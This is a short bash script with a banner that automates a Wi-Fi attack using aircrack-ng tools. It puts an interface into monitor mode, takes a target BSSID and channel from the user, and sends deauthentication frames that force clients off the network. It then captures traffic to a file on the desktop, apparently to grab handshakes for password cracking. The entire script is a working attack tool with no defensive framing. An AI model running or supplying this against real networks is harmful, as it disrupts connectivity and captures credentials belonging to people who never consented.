#!/bin/bash
echo "$(tput setaf 6) 
    __  ___  ____    ____    ____    ___      __      __
   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
 / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 

" 
echo "$(tput setaf 1)Put in the interface!"
read INNTERFACE
airmon-ng start $INNTERFACE
gnome-terminal --geometry 100x20+0+999999 -e ./AIRODUMP.sh
clear
echo Put in the BSSID!
read BSSIDCAP
echo Put in the CHANNEL!
read CHANNELCAP
xterm -e aireplay-ng --deauth 10 -a $BSSIDCAP wlan0mon &
airodump-ng -c $CHANNELCAP --bssid $BSSIDCAP -w /root/Desktop/ $INNTERFACE
sleep 20
exit
